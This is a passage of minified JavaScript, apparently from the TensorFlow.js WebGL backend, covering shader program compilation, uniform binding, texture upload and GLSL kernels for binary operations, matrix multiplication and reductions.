                          , y = n.packedInputs || u.length > 2 ? "" : `${c[0] > 1}_${c[1] > 1}`;
                        s += `${m}_${I}_${l ? d : ""}_${u.length}_${b}_${x}_${g}_${h}_${p}_${f}_${y}_${a}`
                    } else {
                        const c = i.isUniform ? "uniform" : i.texData.texShape;
                        s += `${i.shape}_${c}_${a}`
                    }
                }
                ));
                const o = n.userCode;
                let r = n.constructor.name;
                return r += "_" + s + "_" + o + `${z().getNumber("WEBGL_VERSION")}`,
                r
            }(t, u, d)
              , p = this.getAndSaveBinary(h, (()=>wF(this.gpgpu, t, u, d)))
              , f = null != this.activeTimers;
            let m;
            f && (m = this.startTimer()),
            z().get("ENGINE_COMPILE_ONLY") || function CF(n, t, e, s, o) {
                t.program.enableShapeUniforms || (m1(t.inShapeInfos, e),
                m1([t.outShapeInfo], [s]));
                const r = s.texData.texture
                  , i = s.texData.texShape;
                s.texData.isPacked ? n.setOutputPackedMatrixTexture(r.texture, i[0], i[1]) : n.setOutputMatrixTexture(r.texture, i[0], i[1]),
                n.setProgram(t.webGLProgram),
                n.bindVertexArray(t.webGLProgram.vao),
                1 === z().getNumber("WEBGL_VERSION") && null !== t.infLoc && n.gl.uniform1f(t.infLoc, 1 / 0),
                null !== t.nanLoc && n.gl.uniform1f(t.nanLoc, NaN);
                for (let c = 0; c < e.length; ++c) {
                    const l = e[c]
                      , {uniform: u, offset: d, shape: h, texShape: p} = t.variablesLocations[c];
                    if (h) {
                        const {uniformShape: f} = Rp(t.program.packedInputs, l.shape, l.texData.texShape);
                        switch (f.length) {
                        case 1:
                            n.gl.uniform1iv(h, new Int32Array(f));
                            break;
                        case 2:
                            n.gl.uniform2iv(h, new Int32Array(f));
                            break;
                        case 3:
                            n.gl.uniform3iv(h, new Int32Array(f));
                            break;
                        case 4:
                            n.gl.uniform4iv(h, new Int32Array(f))
                        }
                    }
                    if (p && n.gl.uniform2i(p, l.texData.texShape[0], l.texData.texShape[1]),
                    null != u) {
                        if (l.isUniform) {
                            if (Z(l.shape) < 2)
                                n.gl.uniform1f(u, l.uniformValues[0]);
                            else {
                                let f = l.uniformValues;
                                f instanceof Float32Array || (f = new Float32Array(f)),
                                n.gl.uniform1fv(u, f)
                            }
                            continue
                        }
                        null != l.texData.slice && null != d && n.gl.uniform1i(d, l.texData.slice.flatOffset),
                        n.setInputMatrixTexture(l.texData.texture.texture, u, c)
                    }
                }
                const a = t.outShapeLocation;
                if (a)
                    switch (s.shape.length) {
                    case 1:
                        n.gl.uniform1iv(a, new Int32Array(s.shape));
                        break;
                    case 2:
                        n.gl.uniform2iv(a, new Int32Array(s.shape));
                        break;
                    case 3:
                        n.gl.uniform3iv(a, new Int32Array(s.shape));
                        break;
                    case 4:
                        n.gl.uniform4iv(a, new Int32Array(s.shape))
                    }
                if (t.outShapeStridesLocation) {
                    const c = ct(s.shape);
                    switch (s.shape.length) {
                    case 2:
                        n.gl.uniform1iv(t.outShapeStridesLocation, new Int32Array(c));
                        break;
                    case 3:
                        n.gl.uniform2iv(t.outShapeStridesLocation, new Int32Array(c));
                        break;
                    case 4:
                        n.gl.uniform3iv(t.outShapeStridesLocation, new Int32Array(c))
                    }
                }
                if (t.outTexShapeLocation && n.gl.uniform2i(t.outTexShapeLocation, s.texData.texShape[0], s.texData.texShape[1]),
                t.program.customUniforms && o)
                    for (let c = 0; c < t.program.customUniforms.length; ++c) {
                        const l = t.program.customUniforms[c]
                          , u = t.customUniformLocations[c]
                          , d = o[c];
                        if ("float" === l.type)
                            n.gl.uniform1fv(u, d);
                        else if ("vec2" === l.type)
                            n.gl.uniform2fv(u, d);
                        else if ("vec3" === l.type)
                            n.gl.uniform3fv(u, d);
                        else if ("vec4" === l.type)
                            n.gl.uniform4fv(u, d);
                        else if ("int" === l.type)
                            n.gl.uniform1iv(u, d);
                        else if ("ivec2" === l.type)
                            n.gl.uniform2iv(u, d);
                        else if ("ivec3" === l.type)
                            n.gl.uniform3iv(u, d);
                        else {
                            if ("ivec4" !== l.type)
                                throw Error(`uniform type ${l.type} is not supported yet.`);
                            n.gl.uniform4iv(u, d)
                        }
                    }
                n.executeProgram()
            }(this.gpgpu, p, u, d, o),
            l.forEach((b=>this.disposeIntermediateTensorInfo(b))),
            f && (m = this.endTimer(m),
            this.activeTimers.push({
                name: t.constructor.name,
                query: this.getQueryTime(m)
            }));
            const g = z().getNumber("WEBGL_FLUSH_THRESHOLD");
            if (g > 0) {
                const b = Ve();
                b - this.lastGlFlushTime > g && (this.gpgpu.gl.flush(),
                this.lastGlFlushTime = b)
            }
            if (!z().getBool("WEBGL_LAZILY_UNPACK") && c.isPacked && !1 === r) {
                const b = this.unpackTensor(a);
                return this.disposeIntermediateTensorInfo(a),
                b
            }
            return a
        }
        compileAndRun(t, e, s, o, r=!1) {
            return s = s || e[0].dtype,
            this.runWebGLProgram(t, e, s, o, r)
        }
        getAndSaveBinary(t, e) {
            return t in this.binaryCache || (this.binaryCache[t] = e()),
            this.binaryCache[t]
        }
        getTextureManager() {
            return this.textureManager
        }
        dispose() {
            this.disposed || (z().getBool("IS_TEST") || Object.keys(this.binaryCache).forEach((e=>{
                this.gpgpu.deleteProgram(this.binaryCache[e].webGLProgram),
                delete this.binaryCache[e]
            }
            )),
            this.textureManager.dispose(),
            null != this.canvas && typeof HTMLCanvasElement < "u" && this.canvas instanceof HTMLCanvasElement ? this.canvas.remove() : this.canvas = null,
            this.gpgpuCreatedLocally && (this.gpgpu.program = null,
            this.gpgpu.dispose()),
            this.disposed = !0)
        }
        floatPrecision() {
            return null == this.floatPrecisionValue && (this.floatPrecisionValue = M((()=>{
                if (!z().get("WEBGL_RENDER_FLOAT32_ENABLED")) {
                    const t = z().getBool("DEBUG");
                    z().set("DEBUG", !1);
                    const e = this.abs(Gt(1e-8)).dataSync()[0];
                    if (z().set("DEBUG", t),
                    e > 0)
                        return 32
                }
                return 16
            }
            ))),
            this.floatPrecisionValue
        }
        epsilon() {
            return 32 === this.floatPrecision() ? 1e-7 : 1e-4
        }
        uploadToGPU(t) {
            const e = this.texData.get(t)
              , {shape: s, dtype: o, values: r, texture: i, usage: a, isPacked: c} = e;
            if (null != i)
                return;
            const l = null != this.activeTimers;
            let u;
            l && (u = Ve());
            let d = e.texShape;
            if (null == d && (d = function $V(n, t=!1) {
                let e = z().getNumber("WEBGL_MAX_TEXTURE_SIZE")
                  , s = z().getNumber("WEBGL_MAX_SIZE_FOR_NARROW_TEXTURE");
                s === 1 / 0 && z().getBool("WEBGL_AUTO_SQUARIFY_NARROW_TEXTURE_SHAPE") && (s = e / 2),
                t && (e *= 2,
                s *= 2,
                1 === (n = n.map(((a,c)=>c >= n.length - 2 ? Bl(n[c]) : n[c]))).length && (n = [2, n[0]])),
                2 !== n.length && (n = fs(n).newShape);
                let o = Z(n)
                  , r = null;
                n.length <= 1 && o <= e ? r = [1, o] : 2 === n.length && n[0] <= e && n[1] <= e ? r = n : 3 === n.length && n[0] * n[1] <= e && n[2] <= e ? r = [n[0] * n[1], n[2]] : 3 === n.length && n[0] <= e && n[1] * n[2] <= e ? r = [n[0], n[1] * n[2]] : 4 === n.length && n[0] * n[1] * n[2] <= e && n[3] <= e ? r = [n[0] * n[1] * n[2], n[3]] : 4 === n.length && n[0] <= e && n[1] * n[2] * n[3] <= e && (r = [n[0], n[1] * n[2] * n[3]]);
                const i = null != r && Math.max(...r) > s && Math.min(...r) <= (t ? 2 : 1) && Math.min(...r) > 0;
                if (null == r || i)
                    if (t) {
                        const a = ur(n);
                        let c = 2
                          , l = 2;
                        n.length && ([c,l] = dr(n)),
                        o = a * (c / 2) * (l / 2),
                        r = Ul(o).map((u=>2 * u))
                    } else
                        r = Ul(o);
                return r
            }(s, c),
            e.texShape = d),
            null != r) {
                const h = vl(s);
                let p, f = d[1], m = d[0];
                const g = r instanceof Uint8Array || r instanceof Uint8ClampedArray;
                (c || !g) && ([f,m] = lr(d[0], d[1])),
                p = c ? new $F(h,g) : new g1(h,g);
                const b = g ? [m, f] : d
                  , x = this.makeTensorInfo(b, o)
                  , I = this.texData.get(x.dataId);
                I.usage = g ? an.PIXELS : an.UPLOAD,
                I.texShape = b,
                this.gpgpu.uploadDenseMatrixToTexture(this.getTexture(x.dataId), f, m, r);
                const y = [[m, f]]
                  , C = this.runWebGLProgram(p, [x], o, y, !0)
                  , k = this.texData.get(C.dataId);
                e.texShape = k.texShape,
                e.isPacked = k.isPacked,
                e.usage = k.usage,
                z().get("ENGINE_COMPILE_ONLY") ? this.disposeData(C.dataId) : (e.texture = k.texture,
                e.values = null,
                this.texData.delete(C.dataId)),
                this.disposeIntermediateTensorInfo(x),
                l && (this.uploadWaitMs += Ve() - u)
            } else {
                const h = this.acquireTexture(d, a, o, c);
                e.texture = h
            }
        }
        convertAndCacheOnCPU(t, e) {
            const s = this.texData.get(t)
              , {dtype: o} = s;
            return null != e && (s.values = function lX(n, t) {
                if ("float32" === t || "complex64" === t)
                    return n;
                if ("int32" === t || "bool" === t) {
                    const e = "int32" === t ? new Int32Array(n.length) : new Uint8Array(n.length);
                    for (let s = 0; s < e.length; ++s)
                        e[s] = Math.round(n[s]);
                    return e
                }
                throw new Error(`Unknown dtype ${t}`)
            }(e, o)),
            s.values
        }
        acquireTexture(t, e, s, o) {
            if (this.numBytesInGPU += this.computeBytes(t, s),
            !this.warnedAboutMemory && this.numBytesInGPU > 1024 * this.numMBBeforeWarning * 1024) {
                const r = (this.numBytesInGPU / 1024 / 1024).toFixed(2);
                this.warnedAboutMemory = !0,
                console.warn(`High memory usage in GPU: ${r} MB, most likely due to a memory leak`)
            }
            return this.textureManager.acquireTexture(t, e, o)
        }
        computeBytes(t, e) {
            return t[0] * t[1] * xa(e)
        }
        checkCompileCompletion() {
            for (const [,t] of Object.entries(this.binaryCache))
                this.checkCompletion_(t)
        }
        async checkCompileCompletionAsync() {
            const t = [];
            if (this.gpgpu.parallelCompilationExtension) {
                for (const [,e] of Object.entries(this.binaryCache))
                    t.push(this.checkCompletionAsync_(e));
                return Promise.all(t)
            }
            for (const [,e] of Object.entries(this.binaryCache)) {
                const s = new Promise((o=>{
                    try {
                        this.checkCompletion_(e),
                        o(!0)
                    } catch (r) {
                        throw r
                    }
                }
                ));
                t.push(s)
            }
            return Promise.all(t)
        }
        async checkCompletionAsync_(t) {
            return this.gpgpu.gl.getProgramParameter(t.webGLProgram, this.gpgpu.parallelCompilationExtension.COMPLETION_STATUS_KHR) ? this.checkCompletion_(t) : (await Xc(),
            this.checkCompletionAsync_(t))
        }
        checkCompletion_(t) {
            if (!1 === this.gpgpu.gl.getProgramParameter(t.webGLProgram, this.gpgpu.gl.LINK_STATUS))
                throw console.log(this.gpgpu.gl.getProgramInfoLog(t.webGLProgram)),
                !1 === this.gpgpu.gl.getShaderParameter(t.fragmentShader, this.gpgpu.gl.COMPILE_STATUS) ? (i1(t.source, this.gpgpu.gl.getShaderInfoLog(t.fragmentShader)),
                new Error("Failed to compile fragment shader.")) : new Error("Failed to link vertex and fragment shaders.");
            return !0
        }
        getUniformLocations() {
            for (const t of Object.values(this.binaryCache)) {
                this.gpgpu.buildVao(t.webGLProgram);
                const {variablesLocations: e, customUniformLocations: s, infLoc: o, nanLoc: r, outShapeLocation: i, outShapeStridesLocation: a, outTexShapeLocation: c} = f1(this.gpgpu, t.program, t.webGLProgram);
                t.variablesLocations = e,
                t.customUniformLocations = s,
                t.infLoc = o,
                t.nanLoc = r,
                t.outShapeLocation = i,
                t.outShapeStridesLocation = a,
                t.outTexShapeLocation = c
            }
        }
        createTensorFromGPUData(t, e, s) {
            t.channels = t.channels || "RGBA";
            const {texture: o, height: r, width: i, channels: a} = t
              , c = zt().backend;
            if (!c.gpgpu.gl.isTexture(o))
                throw new Error("The texture is invalid. Also, please make sure the texture and the TFJS WebGL backend are using the same canvas. If you want to use your own custom canvas, you have to create and use the custom TFJS WebGL backend created from the canvas through 'new tf.MathBackendWebGL(customCanvas)'.");
            const l = c.writeTexture(o, e, s, r, i, a);
            return zt().makeTensorFromDataId(l, e, s, c)
        }
    }
    Rl.nextDataId = 0,
    pm() && bm("webgl", (()=>new Rl), 2);
    const Lp = "\n  if (isnan(a)) return a;\n  if (isnan(b)) return b;\n";
    class ko {
        constructor(t, e, s) {
            this.variableNames = ["A", "B"],
            this.outputShape = gt(e, s),
            this.enableShapeUniforms = Ne(this.outputShape.length),
            this.userCode = `\n      float binaryOperation(float a, float b) {\n        ${t}\n      }\n\n      void main() {\n        float a = getAAtOutCoords();\n        float b = getBAtOutCoords();\n        setOutput(binaryOperation(a, b));\n      }\n    `
        }
    }
    const To = "\n  result.r = isNaN.r ? NAN : result.r;\n  result.g = isNaN.g ? NAN : result.g;\n  result.b = isNaN.b ? NAN : result.b;\n  result.a = isNaN.a ? NAN : result.a;\n";
    class gr {
        constructor(t, e, s, o=!1) {
            this.variableNames = ["A", "B"],
            this.supportsBroadcasting = !0,
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outputShape = gt(e, s);
            const r = this.outputShape.length;
            this.enableShapeUniforms = Ne(r);
            let i = "";
            if (o)
                if (0 === r || 1 === Z(this.outputShape))
                    i = "\n          result.y = 0.;\n          result.z = 0.;\n          result.w = 0.;\n        ";
                else if (i = `\n          ${Wt(r)} coords = getOutputCoords();\n        `,
                1 === r)
                    this.enableShapeUniforms ? i += "\n            result.y = (coords + 1) >= outShape ? 0. : result.y;\n            result.z = 0.;\n            result.w = 0.;\n          " : i += `\n            result.y = (coords + 1) >= ${this.outputShape[0]} ? 0. : result.y;\n            result.z = 0.;\n            result.w = 0.;\n          `;
                else {
                    const c = We("coords", r);
                    this.enableShapeUniforms ? i += `\n            bool nextRowOutOfBounds =\n              (${c[r - 2]} + 1) >= outShape[${r} - 2];\n            bool nextColOutOfBounds =\n              (${c[r - 1]} + 1) >= outShape[${r} - 1];\n            result.y = nextColOutOfBounds ? 0. : result.y;\n            result.z = nextRowOutOfBounds ? 0. : result.z;\n            result.w = nextColOutOfBounds || nextRowOutOfBounds ? 0. : result.w;\n          ` : i += `\n            bool nextRowOutOfBounds =\n              (${c[r - 2]} + 1) >= ${this.outputShape[r - 2]};\n            bool nextColOutOfBounds =\n              (${c[r - 1]} + 1) >= ${this.outputShape[r - 1]};\n            result.y = nextColOutOfBounds ? 0. : result.y;\n            result.z = nextRowOutOfBounds ? 0. : result.z;\n            result.w = nextColOutOfBounds || nextRowOutOfBounds ? 0. : result.w;\n          `
                }
            this.userCode = `\n      vec4 binaryOperation(vec4 a, vec4 b) {\n        ${t}\n      }\n\n      void main() {\n        vec4 a = getAAtOutCoords();\n        vec4 b = getBAtOutCoords();\n\n        vec4 result = binaryOperation(a, b);\n        ${i}\n\n        setOutput(result);\n      }\n    `
        }
    }
    function Je(n) {
        const {inputs: t, backend: e} = n
          , {x: s} = t;
        return e.incRef(s.dataId),
        {
            dataId: s.dataId,
            shape: s.shape,
            dtype: s.dtype
        }
    }
    const uX = {
        kernelName: Kr,
        backendName: "webgl",
        kernelFunc: Je
    };
    function zs(n) {
        const {inputs: t, backend: e} = n
          , {real: s, imag: o} = t
          , r = e.makeTensorInfo(s.shape, "complex64")
          , i = e.texData.get(r.dataId)
          , a = Je({
            inputs: {
                x: s
            },
            backend: e
        })
          , c = Je({
            inputs: {
                x: o
            },
            backend: e
        });
        return i.complexTensorInfos = {
            real: a,
            imag: c
        },
        r
    }
    const dX = {
        kernelName: lu,
        backendName: "webgl",
        kernelFunc: zs
    }
      , L1 = "return (a < 0.) ? b * a : a;"
      , E1 = "\n  vec4 aLessThanZero = vec4(lessThan(a, vec4(0.)));\n  return (aLessThanZero * (b * a)) + ((vec4(1.0) - aLessThanZero) * a);\n";
    const pX = {
        kernelName: Xa,
        backendName: "webgl",
        kernelFunc: function hX(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {alpha: r} = s
              , i = e.makeTensorInfo([], "float32", gs(r, "float32"))
              , a = z().getBool("WEBGL_PACK_BINARY_OPERATIONS") ? new gr(E1,o.shape,i.shape) : new ko(L1,o.shape,i.shape)
              , c = e.runWebGLProgram(a, [o, i], "float32");
            return e.disposeIntermediateTensorInfo(i),
            c
        }
    }
      , D1 = "return (a < 0.) ? b * a : a;"
      , W1 = "\n  vec4 aLessThanZero = vec4(lessThan(a, vec4(0.)));\n  return (aLessThanZero * (b * a)) + ((vec4(1.0) - aLessThanZero) * a);\n";
    const mX = {
        kernelName: oc,
        backendName: "webgl",
        kernelFunc: function fX(n) {
            const {inputs: t, backend: e} = n
              , {x: s, alpha: o} = t
              , r = z().getBool("WEBGL_PACK_BINARY_OPERATIONS") ? new gr(W1,s.shape,o.shape) : new ko(D1,s.shape,o.shape);
            return e.runWebGLProgram(r, [s, o], "float32")
        }
    }
      , br = "if (isnan(x)) return x;";
    function Tt({opSnippet: n, packedOpSnippet: t, cpuKernelImpl: e, dtype: s}) {
        return ({inputs: o, backend: r})=>{
            const {x: i} = o
              , a = r
              , c = s || i.dtype;
            if (a.shouldExecuteOnCPU([i]) && null != e) {
                const d = a.texData.get(i.dataId)
                  , h = e(d.values, c);
                return a.makeTensorInfo(i.shape, c, h)
            }
            let u;
            return u = z().getBool("WEBGL_PACK_UNARY_OPERATIONS") && null != t ? new Fs(i.shape,t) : new jn(i.shape,n),
            a.runWebGLProgram(u, [i], c)
        }
    }
    function Ce({opSnippet: n, packedOpSnippet: t, checkOutOfBounds: e=!1, supportsComplex: s=!1, cpuKernelImpl: o, dtype: r}) {
        return ({inputs: i, backend: a})=>{
            const {a: c, b: l} = i
              , u = a;
            if (s && "complex64" === c.dtype) {
                const f = u.texData.get(c.dataId)
                  , m = u.texData.get(l.dataId)
                  , [g,b] = [[f.complexTensorInfos.real, m.complexTensorInfos.real], [f.complexTensorInfos.imag, m.complexTensorInfos.imag]].map((I=>{
                    const [y,w] = I
                      , C = {
                        dataId: y.dataId,
                        dtype: y.dtype,
                        shape: c.shape
                    }
                      , k = {
                        dataId: w.dataId,
                        dtype: w.dtype,
                        shape: l.shape
                    }
                      , S = new ko(n,c.shape,l.shape);
                    return u.runWebGLProgram(S, [C, k], _e(y.dtype, w.dtype))
                }
                ))
                  , x = zs({
                    inputs: {
                        real: g,
                        imag: b
                    },
                    backend: u
                });
                return u.disposeIntermediateTensorInfo(g),
                u.disposeIntermediateTensorInfo(b),
                x
            }
            const d = r || _e(c.dtype, l.dtype);
            if (("string" === c.dtype || "string" === l.dtype || u.shouldExecuteOnCPU([c, l])) && null != o) {
                const f = u.texData.get(c.dataId).values
                  , m = u.texData.get(l.dataId).values
                  , g = "string" === c.dtype ? cs(f) : f
                  , b = "string" === c.dtype ? cs(m) : m
                  , [x,I] = o(c.shape, l.shape, g, b, d)
                  , y = u.makeTensorInfo(I, d);
                return u.texData.get(y.dataId).values = x,
                y
            }
            let p;
            return p = z().getBool("WEBGL_PACK_BINARY_OPERATIONS") && null != t ? new gr(t,c.shape,l.shape,e) : new ko(n,c.shape,l.shape),
            u.runWebGLProgram(p, [c, l], d)
        }
    }
    function aa(n, t=!1) {
        if ("linear" === n)
            return t ? Qz : Bz;
        if ("relu" === n)
            return t ? jz : _z;
        if ("elu" === n)
            return t ? Jz : Hz;
        if ("relu6" === n)
            return t ? qz : Uz;
        if ("prelu" === n)
            return t ? W1 : D1;
        if ("leakyrelu" === n)
            return t ? E1 : L1;
        if ("sigmoid" === n)
            return t ? tX : Yz;
        throw new Error(`Activation ${n} has not been implemented for the WebGL backend.`)
    }
    class M1 {
        constructor(t, e, s, o=!1, r=!1, i=!1, a=null, c=!1, l=!1) {
            this.variableNames = ["matrixA", "matrixB"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outputShape = s,
            this.enableShapeUniforms = Ne(this.outputShape.length);
            const u = o ? t[1] : t[2]
              , d = Math.ceil(u / 2)
              , h = o ? "i * 2, rc.y" : "rc.y, i * 2"
              , p = r ? "rc.z, i * 2" : "i * 2, rc.z"
              , f = o ? ["a.xxyy", "a.zzww"] : ["a.xxzz", "a.yyww"]
              , m = r ? ["b.xzxz", "b.ywyw"] : ["b.xyxy", "b.zwzw"];
            let g = ""
              , b = "";
            a && (g = c ? `vec4 activation(vec4 a) {\n          vec4 b = getPreluActivationWeightsAtOutCoords();\n          ${a}\n        }` : l ? `vec4 activation(vec4 a) {\n          vec4 b = getLeakyreluAlphaAtOutCoords();\n          ${a}\n        }` : `vec4 activation(vec4 x) {\n          ${a}\n        }`,
            b = "result = activation(result);");
            const x = i ? "result += getBiasAtOutCoords();" : "";
            i && this.variableNames.push("bias"),
            c && this.variableNames.push("preluActivationWeights"),
            l && this.variableNames.push("leakyreluAlpha");
            let I = "rc.x"
              , y = "rc.x";
            t[0] < e[0] ? I = `imod(rc.x, ${t[0]})` : e[0] < t[0] && (y = `imod(rc.x, ${e[0]})`),
            this.userCode = `\n      ${g}\n      // Don't use uniform for sharedDimensionPacked for performance.\n      const float sharedDimension = ${d}.0;\n\n      vec4 dot2x2ARowBCol(ivec3 rc) {\n        vec4 result = vec4(0);\n        int batchA = ${I};\n        int batchB = ${y};\n        for (int i = 0; i < ${d}; i++) {\n          vec4 a = getMatrixA(batchA, ${h});\n          vec4 b = getMatrixB(batchB, ${p});\n\n          // These swizzled products need to be separately added.\n          // See: https://github.com/tensorflow/tfjs/issues/1735\n          result += (${f[0]} * ${m[0]});\n          result += (${f[1]} * ${m[1]});\n        }\n        return result;\n      }\n\n      void main() {\n        ivec3 rc = getOutputCoords();\n        vec4 result = dot2x2ARowBCol(rc);\n\n        ${x}\n\n        ${b}\n\n        setOutput(result);\n      }\n    `
        }
    }
    const V1 = {
        REAL: "return areal * breal - aimag * bimag;",
        IMAG: "return areal * bimag + aimag * breal;"
    };
    class F1 {
        constructor(t, e, s) {
            this.variableNames = ["AReal", "AImag", "BReal", "BImag"],
            this.outputShape = gt(e, s),
            this.userCode = `\n      float binaryOpComplex(\n          float areal, float aimag, float breal, float bimag) {\n        ${t}\n      }\n\n      void main() {\n        float areal = getARealAtOutCoords();\n        float aimag = getAImagAtOutCoords();\n        float breal = getBRealAtOutCoords();\n        float bimag = getBImagAtOutCoords();\n        setOutput(binaryOpComplex(areal, aimag, breal, bimag));\n      }\n    `
        }
    }
    const z1 = "return a * b;";
    function Ep(n) {
        const {inputs: t, backend: e} = n
          , {a: s, b: o} = t
          , r = _e(s.dtype, o.dtype);
        if ("complex64" === s.dtype) {
            const a = e.texData.get(s.dataId)
              , c = e.texData.get(o.dataId)
              , l = new F1(V1.REAL,s.shape,o.shape)
              , u = new F1(V1.IMAG,s.shape,o.shape)
              , d = [{
                dataId: a.complexTensorInfos.real.dataId,
                dtype: a.complexTensorInfos.real.dtype,
                shape: s.shape
            }, {
                dataId: a.complexTensorInfos.imag.dataId,
                dtype: a.complexTensorInfos.imag.dtype,
                shape: s.shape
            }, {
                dataId: c.complexTensorInfos.real.dataId,
                dtype: c.complexTensorInfos.real.dtype,
                shape: o.shape
            }, {
                dataId: c.complexTensorInfos.imag.dataId,
                dtype: c.complexTensorInfos.imag.dtype,
                shape: o.shape
            }]
              , h = e.runWebGLProgram(l, d, "float32")
              , p = e.runWebGLProgram(u, d, "float32")
              , f = zs({
                inputs: {
                    real: h,
                    imag: p
                },
                backend: e
            });
            return e.disposeIntermediateTensorInfo(h),
            e.disposeIntermediateTensorInfo(p),
            f
        }
        if (e.shouldExecuteOnCPU([s, o])) {
            const a = e.texData.get(s.dataId)
              , c = e.texData.get(o.dataId)
              , [l,u] = fz(s.shape, o.shape, a.values, c.values, r)
              , d = e.makeTensorInfo(u, r);
            return e.texData.get(d.dataId).values = l,
            d
        }
        let i;
        return i = z().getBool("WEBGL_PACK_BINARY_OPERATIONS") ? new gr(z1,s.shape,o.shape) : new ko(z1,s.shape,o.shape),
        e.runWebGLProgram(i, [s, o], r)
    }
    const gX = {
        kernelName: jr,
        backendName: "webgl",
        kernelFunc: Ep
    };
    function tt(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {shape: r} = s
          , i = e
          , a = Z(o.shape)
          , c = df(r, a)
          , l = Z(c);
        v(a === l, (()=>`The new shape (${c}) has ${l} elements and the old shape (${o.shape}) has ${a} elements. The new shape and old shape must have the same number of elements.`));
        const u = i.texData.get(o.dataId);
        return !u.isPacked || kl(o.shape, c) || null !== u.texture && kl(u.shape, c) ? (i.incRef(o.dataId),
        {
            dataId: o.dataId,
            shape: c,
            dtype: o.dtype
        }) : function bX(n, t, e) {
            const s = [ur(n.shape), ...dr(n.shape)]
              , o = {
                dtype: n.dtype,
                shape: s,
                dataId: n.dataId
            }
              , r = [ur(t), ...dr(t)]
              , i = new T1(r,s)
              , c = [s]
              , l = e.runWebGLProgram(i, [o], n.dtype, c, !0);
            return {
                dataId: l.dataId,
                shape: t,
                dtype: l.dtype
            }
        }(o, c, i)
    }
    const xX = {
        kernelName: ic,
        backendName: "webgl",
        kernelFunc: tt
    };
    class X1 {
        constructor(t, e) {
            this.variableNames = ["x"];
            const {windowSize: s, batchSize: o, inSize: r, outSize: i} = t;
            this.outputShape = [o, i];
            const a = 4 * Math.floor(s / 4)
              , c = s % 4;
            let l = "sumValue += dot(values, ones);";
            if (null != e) {
                const d = 1 / e;
                l = `sumValue += dot(values * ${Do(d) ? d.toPrecision(2) : d}, ones);`
            }
            let u = "";
            r % s > 0 && (u = `\n        if (inIdx < 0 || inIdx >= ${r}) {\n          return 0.0;\n        }\n      `),
            this.userCode = `\n      const vec4 ones = vec4(1.0, 1.0, 1.0, 1.0);\n\n      float getValue(int batch, int inIdx) {\n        ${u}\n        return getX(batch, inIdx);\n      }\n\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int batch = coords[0];\n        int outIdx = coords[1];\n        int inOffset = outIdx * ${s};\n\n        float sumValue = 0.0;\n\n        for (int i = 0; i < ${a}; i += 4) {\n          int inIdx = inOffset + i;\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1),\n            getValue(batch, inIdx + 2),\n            getValue(batch, inIdx + 3)\n          );\n\n          ${l}\n        }\n\n        int inIdx = inOffset + ${a};\n        if (${1 === c}) {\n          vec4 values = vec4(getValue(batch, inIdx), 0.0, 0.0, 0.0);\n\n          ${l}\n        } else if (${2 === c}) {\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1), 0.0, 0.0);\n\n          ${l}\n        } else if (${3 === c}) {\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1),\n            getValue(batch, inIdx + 2), 0.0);\n\n          ${l}\n        }\n        setOutput(sumValue);\n      }\n    `
        }
    }
    class yX {
        constructor(t, e) {
            this.variableNames = ["x"];
            const {windowSize: s, batchSize: o, inSize: r, outSize: i} = t;
            this.outputShape = [o, i];
            let a = "0.0"
              , c = "";
            "prod" === e ? a = "1.0" : "min" === e ? (a = "1.0 / 1e-20",
            c = "min") : "max" === e && (a = "-1.0 / 1e-20",
            c = "max");
            let l = `${e}(${e}(${e}(minMaxValue[0], minMaxValue[1]), minMaxValue[2]), minMaxValue[3])`;
            "sum" === e ? l = "sumValue" : "prod" === e ? l = "prodValue" : "all" === e ? l = "allValue" : "any" === e && (l = "anyValue");
            const u = 4 * Math.floor(s / 4)
              , d = s % 4;
            let h = `\n      if (${"sum" === e}) {\n        sumValue += dot(values, ones);\n      } else if (${"prod" === e}) {\n        vec2 tmp = vec2(values[0], values[1]) * vec2(values[2], values[3]);\n        prodValue *= tmp[0] * tmp[1];\n      } else {\n        minMaxValue = ${c}(values, minMaxValue);\n        if (${"min" === e} || ${"max" === e}) {\n          minMaxValue = ${c}(values, minMaxValue);\n          bvec4 isNaN = isnan(values);\n          if (isNaN.r || isNaN.g || isNaN.b || isNaN.a) {\n            minMaxValue = vec4(NAN);\n          }\n        }\n      }\n    `
              , p = "vec4";
            "all" === e ? (a = "1.0",
            h = "\n        bool reducedAllValue = all(values);\n        float floatedReducedAllValue = float(reducedAllValue);\n        allValue = float(allValue >= 1.0 && floatedReducedAllValue >= 1.0);\n      ",
            p = "bvec4") : "any" === e && (a = "0.0",
            h = "\n        bool reducedAnyValue = any(values);\n        float floatedReducedAnyValue = float(reducedAnyValue);\n        anyValue = float(anyValue >= 1.0 || floatedReducedAnyValue >= 1.0);\n      ",
            p = "bvec4");
            let f = "";
            r % s > 0 && (f = `\n        if (inIdx < 0 || inIdx >= ${r}) {\n          return initializationValue;\n        }\n      `),
            this.userCode = `\n      const float initializationValue = ${a};\n      const vec4 ones = vec4(1.0, 1.0, 1.0, 1.0);\n\n      float getValue(int batch, int inIdx) {\n        ${f}\n        return getX(batch, inIdx);\n      }\n\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int batch = coords[0];\n        int outIdx = coords[1];\n        int inOffset = outIdx * ${s};\n\n        vec4 minMaxValue = vec4(${a});\n        float prodValue = 1.0;\n        float sumValue = 0.0;\n        float allValue = 1.0;\n        float anyValue = 0.0;\n\n        for (int i = 0; i < ${u}; i += 4) {\n          int inIdx = inOffset + i;\n          ${p} values = ${p}(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1),\n            getValue(batch, inIdx + 2),\n            getValue(batch, inIdx + 3)\n          );\n\n          ${h}\n        }\n\n        int inIdx = inOffset + ${u};\n        if (${1 === d}) {\n          ${p} values = ${p}(\n            getValue(batch, inIdx),\n            initializationValue,\n            initializationValue,\n            initializationValue\n          );\n\n          ${h}\n        } else if (${2 === d}) {\n          ${p} values = ${p}(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1),\n            initializationValue,\n            initializationValue\n          );\n\n          ${h}\n        } else if (${3 === d}) {\n          ${p} values = ${p}(\n            getValue(batch, inIdx),\n            getValue(batch, 